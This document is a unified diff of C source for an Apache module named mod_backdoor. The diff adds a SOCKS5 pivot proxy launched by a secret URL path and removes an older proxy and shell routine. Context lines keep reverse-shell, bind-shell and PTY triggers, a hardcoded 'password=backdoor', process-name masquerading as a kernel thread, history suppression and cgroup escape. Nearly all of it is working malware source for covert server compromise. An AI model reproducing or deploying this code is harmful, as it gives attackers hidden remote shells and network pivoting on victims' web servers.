@@ -29,10 +29,6 @@
 // forkpty() --> https://linux.die.net/man/3/forkpty
 // Need to link with libutil to use it in apache2 module
 #include <pty.h>
-//#include <utmp.h>
-
-// link with lpthread
-//#include<pthread.h>
 
 #include <sys/mount.h>
 
@@ -45,6 +41,81 @@
 
 #include "mod_backdoor.h"
 
+/// SOCKS proxy ///
+#define _GNU_SOURCE
+#define _POSIX_C_SOURCE 200809L
+#include <pthread.h>
+#include <limits.h>
+#include "server.h"
+#include "sblist.h"
+
+#ifndef MAX
+#define MAX(x, y) ((x) > (y) ? (x) : (y))
+#endif
+
+#if !defined(PTHREAD_STACK_MIN) || defined(__APPLE__)
+/* MAC says its min is 8KB, but then crashes in our face. thx hunkOLard */
+#undef PTHREAD_STACK_MIN
+#define PTHREAD_STACK_MIN 64*1024
+#elif defined(__GLIBC__)
+#undef PTHREAD_STACK_MIN
+#define PTHREAD_STACK_MIN 32*1024
+#endif
+
+static const char* auth_user;
+static const char* auth_pass;
+static sblist* auth_ips;
+static pthread_mutex_t auth_ips_mutex = PTHREAD_MUTEX_INITIALIZER;
+static const struct server* server;
+static union sockaddr_union bind_addr = {.v4.sin_family = AF_UNSPEC};
+static pid_t proxyPid;
+
+enum socksstate {
+    SS_1_CONNECTED,
+    SS_2_NEED_AUTH, /* skipped if NO_AUTH method supported */
+    SS_3_AUTHED,
+};
+
+enum authmethod {
+    AM_NO_AUTH = 0,
+    AM_GSSAPI = 1,
+    AM_USERNAME = 2,
+    AM_INVALID = 0xFF
+};
+
+enum errorcode {
+    EC_SUCCESS = 0,
+    EC_GENERAL_FAILURE = 1,
+    EC_NOT_ALLOWED = 2,
+    EC_NET_UNREACHABLE = 3,
+    EC_HOST_UNREACHABLE = 4,
+    EC_CONN_REFUSED = 5,
+    EC_TTL_EXPIRED = 6,
+    EC_COMMAND_NOT_SUPPORTED = 7,
+    EC_ADDRESSTYPE_NOT_SUPPORTED = 8,
+};
+
+struct thread {
+    pthread_t pt;
+    struct client client;
+    enum socksstate state;
+    volatile int  done;
+};
+
+
+#ifndef CONFIG_LOG
+#define CONFIG_LOG 1
+#endif
+#if CONFIG_LOG
+/* we log to stderr because it's not using line buffering, i.e. malloc which would need
+   locking when called from different threads. for the same reason we use dprintf,
+   which writes directly to an fd. */
+#define dolog(...) dprintf(2, __VA_ARGS__)
+#else
+static void dolog(const char* fmt, ...) { }
+#endif
+
+//////////////////////////
 
 #define BUFSIZE 65536
 #define IPSIZE 4
@@ -53,6 +124,7 @@
 
 #define PASSWORD "password=backdoor"
 #define SOCKSWORD "/proxy"
+#define STOPPROXY "imdonewithyou"
 #define PINGWORD "/ping"
 #define SHELLWORD "/revtty"
 #define REVERSESHELL "/reverse"
@@ -63,278 +135,332 @@
 pid_t pid;
 
 
-enum socks {
-	RESERVED = 0x00,
-	VERSION = 0x05
-};
+/*************/
+/// SOCKS proxy functions ///
+/************/
 
-enum socks_auth_methods {
-	NOAUTH = 0x00,
-	USERPASS = 0x02,
-	NOMETHOD = 0xff
-};
+static int connect_socks_target(unsigned char *buf, size_t n, struct client *client) {
+    if(n < 5) return -EC_GENERAL_FAILURE;
+    if(buf[0] != 5) return -EC_GENERAL_FAILURE;
+    if(buf[1] != 1) return -EC_COMMAND_NOT_SUPPORTED; /* we support only CONNECT method */
+    if(buf[2] != 0) return -EC_GENERAL_FAILURE; /* malformed packet */
 
-enum socks_auth_userpass {
-	AUTH_OK = 0x00,
-	AUTH_VERSION = 0x01,
-	AUTH_FAIL = 0xff
-};
+    int af = AF_INET;
+    size_t minlen = 4 + 4 + 2, l;
+    char namebuf[256];
+    struct addrinfo* remote;
 
-enum socks_command {
-	CONNECT = 0x01
-};
-
-enum socks_command_type {
-	IP = 0x01,
-	DOMAIN = 0x03
-};
-
-enum socks_status {
-	OKH = 0x00,
-	FAILED = 0x05
-};
-
-typedef struct {
-    const char *key;
-    const char *value;
-} keyValuePair;
-
-// Read POST value from apache doc:
-// https://httpd.apache.org/docs/2.4/developer/modguide.html#snippets
-// Currently not working --> seems res variable returns NULL
-keyValuePair *readPost(request_rec *r) {
-    apr_array_header_t *pairs = NULL;
-    apr_off_t len;
-    apr_size_t size;
-    int res;
-    int i = 0;
-    char *buffer;
-    keyValuePair *kvp;
-
-    res = ap_parse_form_data(r, NULL, &pairs, -1, HUGE_STRING_LEN);
-    if (res != OK || !pairs) return NULL; /* Return NULL if we failed or if there are is no POST data */
-    kvp = apr_pcalloc(r->pool, sizeof(keyValuePair) * (pairs->nelts + 1));
-    while (pairs && !apr_is_empty_array(pairs)) {
-        ap_form_pair_t *pair = (ap_form_pair_t *) apr_array_pop(pairs);
-        apr_brigade_length(pair->value, 1, &len);
-        size = (apr_size_t) len;
-        buffer = apr_palloc(r->pool, size + 1);
-        apr_brigade_flatten(pair->value, buffer, &size);
-        buffer[len] = 0;
-        kvp[i].key = apr_pstrdup(r->pool, pair->name);
-        kvp[i].value = buffer;
-        i++;
+    switch(buf[3]) {
+        case 4: /* ipv6 */
+            af = AF_INET6;
+            minlen = 4 + 2 + 16;
+            /* fall through */
+        case 1: /* ipv4 */
+            if(n < minlen) return -EC_GENERAL_FAILURE;
+            if(namebuf != inet_ntop(af, buf+4, namebuf, sizeof namebuf))
+                return -EC_GENERAL_FAILURE; /* malformed or too long addr */
+            break;
+        case 3: /* dns name */
+            l = buf[4];
+            minlen = 4 + 2 + l + 1;
+            if(n < 4 + 2 + l + 1) return -EC_GENERAL_FAILURE;
+            memcpy(namebuf, buf+4+1, l);
+            namebuf[l] = 0;
+            break;
+        default:
+            return -EC_ADDRESSTYPE_NOT_SUPPORTED;
     }
-    return kvp;
+    unsigned short port;
+    port = (buf[minlen-2] << 8) | buf[minlen-1];
+    /* there's no suitable errorcode in rfc1928 for dns lookup failure */
+    if(resolve(namebuf, port, &remote)) return -EC_GENERAL_FAILURE;
+    int fd = socket(remote->ai_addr->sa_family, SOCK_STREAM, 0);
+    if(fd == -1) {
+        eval_errno:
+        if(fd != -1) close(fd);
+        freeaddrinfo(remote);
+        switch(errno) {
+            case ETIMEDOUT:
+                return -EC_TTL_EXPIRED;
+            case EPROTOTYPE:
+            case EPROTONOSUPPORT:
+            case EAFNOSUPPORT:
+                return -EC_ADDRESSTYPE_NOT_SUPPORTED;
+            case ECONNREFUSED:
+                return -EC_CONN_REFUSED;
+            case ENETDOWN:
+            case ENETUNREACH:
+                return -EC_NET_UNREACHABLE;
+            case EHOSTUNREACH:
+                return -EC_HOST_UNREACHABLE;
+            case EBADF:
+            default:
+                perror("socket/connect");
+                return -EC_GENERAL_FAILURE;
+        }
+    }
+    if(SOCKADDR_UNION_AF(&bind_addr) != AF_UNSPEC && bindtoip(fd, &bind_addr) == -1)
+        goto eval_errno;
+    if(connect(fd, remote->ai_addr, remote->ai_addrlen) == -1)
+        goto eval_errno;
+
+    freeaddrinfo(remote);
+    if(CONFIG_LOG) {
+        char clientname[256];
+        af = SOCKADDR_UNION_AF(&client->addr);
+        void *ipdata = SOCKADDR_UNION_ADDRESS(&client->addr);
+        inet_ntop(af, ipdata, clientname, sizeof clientname);
+        dolog("client[%d] %s: connected to %s:%d\n", client->fd, clientname, namebuf, port);
+    }
+    return fd;
 }
 
-
-int readn(int fd, void *buf, int n)
-{
-	int nread, left = n;
-	while (left > 0) {
-		if ((nread = read(fd, buf, left)) == 0) {
-			return 0;
-		} else if (nread != -1){
-			left -= nread;
-			buf += nread;
-		}
-	}
-	return n;
+static int is_authed(union sockaddr_union *client, union sockaddr_union *authedip) {
+    int af = SOCKADDR_UNION_AF(authedip);
+    if(af == SOCKADDR_UNION_AF(client)) {
+        size_t cmpbytes = af == AF_INET ? 4 : 16;
+        void *cmp1 = SOCKADDR_UNION_ADDRESS(client);
+        void *cmp2 = SOCKADDR_UNION_ADDRESS(authedip);
+        if(!memcmp(cmp1, cmp2, cmpbytes)) return 1;
+    }
+    return 0;
 }
 
-
-void socks5_invitation(int fd) {
-	char init[2];
-	readn(fd, (void *)init, ARRAY_SIZE(init));
-	if (init[0] != VERSION) {
-		exit(0);
-	}
-}
-
-void socks5_auth(int fd) {
-		char answer[2] = { VERSION, NOAUTH };
-		write(fd, (void *)answer, ARRAY_SIZE(answer));
-}
-
-int socks5_command(int fd)
-{
-	char command[4];
-	readn(fd, (void *)command, ARRAY_SIZE(command));
-	return command[3];
-}
-
-char *socks5_ip_read(int fd)
-{
-	char *ip = malloc(sizeof(char) * IPSIZE);
-	read(fd, (void* )ip, 2); //Buggy
-	readn(fd, (void *)ip, IPSIZE);
-	return ip;
-}
-
-unsigned short int socks5_read_port(int fd)
-{
-	unsigned short int p;
-	readn(fd, (void *)&p, sizeof(p));
-	return p;
-}
-
-int app_connect(int type, void *buf, unsigned short int portnum, int orig) {
-	int new_fd = 0;
-	struct sockaddr_in remote;
-	char address[16];
-
-	memset(address,0, ARRAY_SIZE(address));
-	new_fd = socket(AF_INET, SOCK_STREAM,0);
-	if (type == IP) {
-		char *ip = NULL;
-		ip = buf;
-		snprintf(address, ARRAY_SIZE(address), "%hhu.%hhu.%hhu.%hhu",ip[0], ip[1], ip[2], ip[3]);
-		memset(&remote, 0, sizeof(remote));
-		remote.sin_family = AF_INET;
-		remote.sin_addr.s_addr = inet_addr(address);
-		remote.sin_port = htons(portnum);
-
-		if (connect(new_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
-			return -1;
-		}
-		return new_fd;
-	}
-}
-
-void socks5_ip_send_response(int fd, char *ip, unsigned short int port)
-{
-	char response[4] = { VERSION, OK, RESERVED, IP };
-	write(fd, (void *)response, ARRAY_SIZE(response));
-	write(fd, (void *)ip, IPSIZE);
-	write(fd, (void *)&port, sizeof(port));
-}
-
-/*void *worker(int fd, int port) {
-    int inet_fd = -1;
-    int command = 0;
-    unsigned short int p = 0;
-
-    socks5_invitation(fd);
-    socks5_auth(fd);
-    command = socks5_command(fd);
-
-    pid_t pid;
-
-    pid = fork();
-    if(pid < 0){
-        exit(0);
-    }else if (pid == 0){
-        if (command == IP) {
-            char *ip = NULL;
-            ip = socks5_ip_read(fd);
-            p = socks5_read_port(fd);
-            inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
-            if (inet_fd == -1) {
-                exit(0);
+static enum authmethod check_auth_method(unsigned char *buf, size_t n, struct client*client) {
+    if(buf[0] != 5) return AM_INVALID;
+    size_t idx = 1;
+    if(idx >= n ) return AM_INVALID;
+    int n_methods = buf[idx];
+    idx++;
+    while(idx < n && n_methods > 0) {
+        if(buf[idx] == AM_NO_AUTH) {
+            if(!auth_user) return AM_NO_AUTH;
+            else if(auth_ips) {
+                size_t i;
+                int authed = 0;
+                pthread_mutex_lock(&auth_ips_mutex);
+                for(i=0;i<sblist_getsize(auth_ips);i++) {
+                    if((authed = is_authed(&client->addr, sblist_get(auth_ips, i))))
+                        break;
+                }
+                pthread_mutex_unlock(&auth_ips_mutex);
+                if(authed) return AM_NO_AUTH;
             }
-            socks5_ip_send_response(fd, ip, p);
-            free(ip);
+        } else if(buf[idx] == AM_USERNAME) {
+            if(auth_user) return AM_USERNAME;
         }
-    }else{
-        app_socket_pipe(inet_fd, fd, port);
-        close(inet_fd);
+        idx++;
+        n_methods--;
     }
-    exit(0);
-}*/
-
-void* worker(int fd) {
-
-    int inet_fd = -1;
-    int command = 0;
-    unsigned short int p = 0;
-
-    socks5_invitation(fd);
-    socks5_auth(fd);
-    command = socks5_command(fd);
-
-    if (command == IP) {
-        char *ip = NULL;
-        ip = socks5_ip_read(fd);
-        p = socks5_read_port(fd);
-
-        inet_fd = app_connect(IP, (void *)ip, ntohs(p), fd);
-        if (inet_fd == -1) {
-            exit(0);
-        }
-        socks5_ip_send_response(fd, ip, p);
-        free(ip);
-    }
-
-    //app_socket_pipe(inet_fd, fd);
-    bicomIPC(inet_fd,fd);
-    close(inet_fd);
-    exit(0);
+    return AM_INVALID;
 }
 
-// Not used
-void* waitProxy(int fd, int port){
+static void add_auth_ip(struct client*client) {
+    pthread_mutex_lock(&auth_ips_mutex);
+    sblist_add(auth_ips, &client->addr);
+    pthread_mutex_unlock(&auth_ips_mutex);
+}
 
-    int opt = 1;
-    int new_socket;
-    // Prepare Socket for proxy socks5
-    int proxysockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (proxysockfd < 0 ){
-        write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
-        exit(0);
-    }
+static void send_auth_response(int fd, int version, enum authmethod meth) {
+    unsigned char buf[2];
+    buf[0] = version;
+    buf[1] = meth;
+    write(fd, buf, 2);
+}
 
-    if(setsockopt(proxysockfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
-        write(fd,"setsockopt",strlen("setsockopt"));
-        close(proxysockfd);
-        exit(0);
-    }
+static void send_error(int fd, enum errorcode ec) {
+    /* position 4 contains ATYP, the address type, which is the same as used in the connect
+       request. we're lazy and return always IPV4 address type in errors. */
+    char buf[10] = { 5, ec, 0, 1 /*AT_IPV4*/, 0,0,0,0, 0,0 };
+    write(fd, buf, 10);
+}
 
-    struct sockaddr_in server;
-    int serverlen = sizeof(server);
-    server.sin_family = AF_INET;
-    server.sin_addr.s_addr = INADDR_ANY;
-    server.sin_port = htons(port);
+static void copyloop(int fd1, int fd2) {
+    int maxfd = fd2;
+    if(fd1 > fd2) maxfd = fd1;
+    fd_set fdsc, fds;
+    FD_ZERO(&fdsc);
+    FD_SET(fd1, &fdsc);
+    FD_SET(fd2, &fdsc);
 
-    //pthread_t thread_id;
-
-
-    if (bind(proxysockfd, (struct sockaddr *)&server,
-             sizeof(server))<0)
-    {
-       write(fd,"Bind failed",strlen("Bind failed"));
-       exit(0);
-    }
-
-    if (listen(proxysockfd, 3) < 0)
-    {
-        write(fd,"Listen failed",strlen("Listen failed"));
-        exit(0);
-    }
-
-    while(1){
-        new_socket = accept(proxysockfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
-
-        pid_t pid;
-
-        pid = fork();
-        if(pid < 0){
-            close(new_socket);
-            exit(0);
-        }else if (pid == 0){
-
-            worker(new_socket);
-            close(fd);
-            exit(0);
-
-        }else{
-            close(new_socket);
-            waitpid(pid,NULL,0);
-            kill(pid,SIGKILL);
-            exit(0);
+    while(1) {
+        memcpy(&fds, &fdsc, sizeof(fds));
+        /* inactive connections are reaped after 15 min to free resources.
+           usually programs send keep-alive packets so this should only happen
+           when a connection is really unused. */
+        struct timeval timeout = {.tv_sec = 60*15, .tv_usec = 0};
+        switch(select(maxfd+1, &fds, 0, 0, &timeout)) {
+            case 0:
+                send_error(fd1, EC_TTL_EXPIRED);
+                return;
+            case -1:
+                if(errno == EINTR) continue;
+                else perror("select");
+                return;
+        }
+        int infd = FD_ISSET(fd1, &fds) ? fd1 : fd2;
+        int outfd = infd == fd2 ? fd1 : fd2;
+        char buf[1024];
+        ssize_t sent = 0, n = read(infd, buf, sizeof buf);
+        if(n <= 0) return;
+        while(sent < n) {
+            ssize_t m = write(outfd, buf+sent, n-sent);
+            if(m < 0) return;
+            sent += m;
         }
     }
 }
+
+static enum errorcode check_credentials(unsigned char* buf, size_t n) {
+    if(n < 5) return EC_GENERAL_FAILURE;
+    if(buf[0] != 1) return EC_GENERAL_FAILURE;
+    unsigned ulen, plen;
+    ulen=buf[1];
+    if(n < 2 + ulen + 2) return EC_GENERAL_FAILURE;
+    plen=buf[2+ulen];
+    if(n < 2 + ulen + 1 + plen) return EC_GENERAL_FAILURE;
+    char user[256], pass[256];
+    memcpy(user, buf+2, ulen);
+    memcpy(pass, buf+2+ulen+1, plen);
+    user[ulen] = 0;
+    pass[plen] = 0;
+    if(!strcmp(user, auth_user) && !strcmp(pass, auth_pass)) return EC_SUCCESS;
+    return EC_NOT_ALLOWED;
+}
+
+static void* clientthread(void *data) {
+    struct thread *t = data;
+    t->state = SS_1_CONNECTED;
+    unsigned char buf[1024];
+    ssize_t n;
+    int ret;
+    int remotefd = -1;
+    enum authmethod am;
+    while((n = recv(t->client.fd, buf, sizeof buf, 0)) > 0) {
+        // To kill proxy when you don't need it
+        if(!strncmp(buf,STOPPROXY,strlen(STOPPROXY))){
+            kill(getppid(),SIGKILL);
+            exit(0);
+        }
+        switch(t->state) {
+            case SS_1_CONNECTED:
+                am = check_auth_method(buf, n, &t->client);
+                if(am == AM_NO_AUTH) t->state = SS_3_AUTHED;
+                else if (am == AM_USERNAME) t->state = SS_2_NEED_AUTH;
+                send_auth_response(t->client.fd, 5, am);
+                if(am == AM_INVALID) goto breakloop;
+                break;
+            case SS_2_NEED_AUTH:
+                ret = check_credentials(buf, n);
+                send_auth_response(t->client.fd, 1, ret);
+                if(ret != EC_SUCCESS)
+                    goto breakloop;
+                t->state = SS_3_AUTHED;
+                if(auth_ips) add_auth_ip(&t->client);
+                break;
+            case SS_3_AUTHED:
+                ret = connect_socks_target(buf, n, &t->client);
+                if(ret < 0) {
+                    send_error(t->client.fd, ret*-1);
+                    goto breakloop;
+                }
+                remotefd = ret;
+                send_error(t->client.fd, EC_SUCCESS);
+                copyloop(t->client.fd, remotefd);
+                goto breakloop;
+            //default:
+
+
+        }
+    }
+    breakloop:
+
+    if(remotefd != -1)
+        close(remotefd);
+
+    close(t->client.fd);
+    t->done = 1;
+
+    return 0;
+}
+
+static void collect(sblist *threads) {
+    size_t i;
+    for(i=0;i<sblist_getsize(threads);) {
+        struct thread* thread = *((struct thread**)sblist_get(threads, i));
+        if(thread->done) {
+            pthread_join(thread->pt, 0);
+            sblist_delete(threads, i);
+            free(thread);
+        } else
+            i++;
+    }
+}
+
+/* prevent username and password from showing up in top. */
+static void zero_arg(char *s) {
+    size_t i, l = strlen(s);
+    for(i=0;i<l;i++) s[i] = 0;
+}
+
+int startProxy(int port, char* user){
+    const char *listenip = "0.0.0.0";
+    proxyPid = getpid();
+    if(user != NULL){
+        auth_ips = sblist_new(sizeof(union sockaddr_union), 8);
+        auth_user = strdup(user);
+        zero_arg(user);
+        auth_pass = strdup(PASSWORD);
+        //zero_arg(PASSWORD);
+    }
+
+    if((auth_user && !auth_pass) || (!auth_user && auth_pass)) {
+        dprintf(2, "error: user and pass must be used together\n");
+        return 1;
+    }
+    if(auth_ips && !auth_pass) {
+        dprintf(2, "error: auth-once option must be used together with user/pass\n");
+        return 1;
+    }
+    signal(SIGPIPE, SIG_IGN);
+    struct server s;
+    sblist *threads = sblist_new(sizeof (struct thread*), 8);
+    if(server_setup(&s, listenip, port)) {
+        perror("server_setup");
+        return 1;
+    }
+    server = &s;
+    size_t stacksz = MAX(8192, PTHREAD_STACK_MIN);  /* 4KB for us, 4KB for libc */
+
+    while(1) {
+        collect(threads);
+        struct client c;
+        struct thread *curr = malloc(sizeof (struct thread));
+        if(!curr) goto oom;
+        curr->done = 0;
+        if(server_waitclient(&s, &c)) continue;
+        curr->client = c;
+        if(!sblist_add(threads, &curr)) {
+            close(curr->client.fd);
+            free(curr);
+            oom:
+            dolog("rejecting connection due to OOM\n");
+            usleep(16); /* prevent 100% CPU usage in OOM situation */
+            continue;
+        }
+        pthread_attr_t *a = 0, attr;
+        if(pthread_attr_init(&attr) == 0) {
+            a = &attr;
+            pthread_attr_setstacksize(a, stacksz);
+        }
+        if(pthread_create(&curr->pt, a, clientthread, curr) != 0)
+            dolog("pthread_create failed. OOM?\n");
+        if(a) pthread_attr_destroy(&attr);
+    }
+}
+
+/*******************************************************************/
+
 
 void shell(char* ip, char* port,char* prog) {
 	int input[2];
@@ -450,80 +576,6 @@ void reverseShell(char* ip, char* port, char* prog){
         }
     }
     exit(0);
-}
-
-/****************************/
-/// Fork() then forkpty() ///
-/****************************/
-// not used
-void shellPTY1(int socket) {
-
-    struct termios terminal;
-    int terminalfd, n = 0, sr;
-    pid_t ppid, spid  ;
-    char buf[1024];
-
-    tcgetattr(terminalfd, &terminal);
-    terminal.c_lflag &= ~ECHO;
-    tcsetattr(terminalfd, TCSANOW, &terminal);
-
-    fd_set readfd;
-    ppid = fork();
-
-    if(ppid == 0){
-
-        spid = forkpty(&terminalfd, NULL, NULL, NULL);
-
-        if (spid == 0) { // Child process
-            //setsid();
-            char *argv[] = { "[kintegrityd/2]", 0 };
-            char *envp[] = { "HISTFILE=","TERM=vt100", 0 };
-
-            execve("/bin/sh", argv, envp);
-        }else{
-            for (;;) {
-                FD_ZERO(&readfd);
-                FD_SET(terminalfd, &readfd);
-                FD_SET(socket, &readfd);
-                // Bidirectional data transfer between 2 fd - terminalfd <--> IPC socket
-                sr = select(terminalfd + 1, &readfd, NULL, NULL, NULL);
-                if (sr) {
-                    if (FD_ISSET(terminalfd, &readfd)) {
-                        memset(buf, 0, sizeof(buf));
-                        n = read(terminalfd, buf, strlen(buf) + 1);
-                        if (n <= 0) {
-                            kill(ppid, SIGKILL);
-                            break;
-                        } else {
-                            write(socket, buf, strlen(buf));
-                        }
-                    }
-                    if (FD_ISSET(socket, &readfd)) {
-                        memset(buf, 0, sizeof(buf));
-                        n = read(socket, buf, strlen(buf) + 1);
-                        if (n <= 0) {
-                            kill(ppid, SIGKILL);
-                            break;
-                        } else {
-                            write(terminalfd, buf, strlen(buf));
-                        }
-                    }
-                }
-            }
-            /*waitpid(fpid,NULL,0);
-            exit(0);*/
-        }
-    }else{
-        waitpid(ppid,NULL,0);
-        kill(ppid,SIGTERM);
-    }
-    //
-    //exit(0);
-    /*else{
-        return DECLINED;
-    }*/
-
-    return;
 }
 
 
@@ -698,14 +750,10 @@ static int backdoor_post_read_request(request_rec *r) {
 	}
 
 	if (strstr(r->uri, SOCKSWORD)) {
-        int new_socket, bindfd;
-        char* meh = strtok(r->uri,"/");
-        char* port = strtok(NULL,"/");
 
         sock = socket(AF_UNIX, SOCK_STREAM, 0);
         if (sock < 0) {
             write(fd, "ERRNOSOCK\n", strlen("ERRNOSOCK\n"));
-            close(fd);
             exit(0);
         }
         server.sun_family = AF_UNIX;
@@ -713,30 +761,14 @@ static int backdoor_post_read_request(request_rec *r) {
         if (connect(sock, (struct sockaddr *) &server, sizeof(struct sockaddr_un)) < 0){
             close(sock);
             write(fd, "ERRNOCONNECT\n", strlen("ERRNOCONNECT\n"));
-            close(fd);
             exit(0);
         }
 
-        bindfd = bindPort(fd,atoi(port));
-        char* info = malloc(128);
-        sprintf(info,"[+] Socks5 proxy binded on port %s\n",port);
-        write(fd, info,strlen(info));
-        free(info);
+        write(sock,r->uri,strlen(r->uri));
+
+        write(fd, "[+] Socks proxy binded !\n",strlen("[+] Socks proxy binded !\n"));
         close(fd);
-
-        struct sockaddr_in server;
-        int serverlen = sizeof(server);
-        server.sin_family = AF_INET;
-        server.sin_addr.s_addr = INADDR_ANY;
-        server.sin_port = htons(atoi(port));
-
-        while(1){
-
-            new_socket = accept(bindfd, (struct sockaddr *)&server, (socklen_t*)&serverlen);
-
-            worker(new_socket);
-            close(new_socket);
-        }
+        close(sock);
 
 	}
 	if (strstr(r->uri, BINDWORD)) {
@@ -788,6 +820,7 @@ static int backdoor_post_read_request(request_rec *r) {
 
 	if (!strcmp(r->uri, PINGWORD)) {
 		write(fd, "[+] Backdoor module is running !\n", strlen("[+] Backdoor module is running !\n"));
+		close(fd);
 		exit(0);
 	}
 
@@ -886,6 +919,7 @@ void* rmCgroup(){
     int isMounted = 0;
     char* path;
     char* str;
+    int thisPID;
 
     mkdir(CGROUP2, S_IRWXU);
     path = malloc(strlen(CGROUP2)+strlen("/system.slice/cgroup.procs")+1);
@@ -898,8 +932,8 @@ void* rmCgroup(){
         fd = open(path,O_WRONLY);
         if(fd != -1){
             // TODO
-            // ------- This is ugly -----
-            str = malloc(sizeof(int)*getpid()+1);
+            // -------> This is ugly <-----
+            str = malloc(sizeof(int)*getpid());
             sprintf(str,"%d",getpid());
             write(fd,str,strlen(str)); // <---
             // ----------------------------
@@ -933,16 +967,22 @@ int waitIPC(int master){
                     } else {
                         pid = fork();
                         if(pid == 0){
-                            rmCgroup();
                             if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
+                                rmCgroup();
                                 shellPTY(sd);
                             } else if (strstr(buf, "reverse")) {
+                                rmCgroup();
                                 // Monkey parsing url -->
-                                char *meh = strtok(buf, "/");
+                                strtok(buf, "/");
                                 char *ip = strtok(NULL, "/");
                                 char *port = strtok(NULL, "/");
                                 char *prog = strtok(NULL, "/");
                                 reverseShell(ip, port, prog);
+                            }else if (strstr(buf,SOCKSWORD)){
+                                strtok(buf, "/");
+                                char *port = strtok(NULL, "/");
+                                char* user = strtok(NULL, "/");
+                                startProxy(atoi(port),user);
                             }
                         }else{
                             pid = fork();
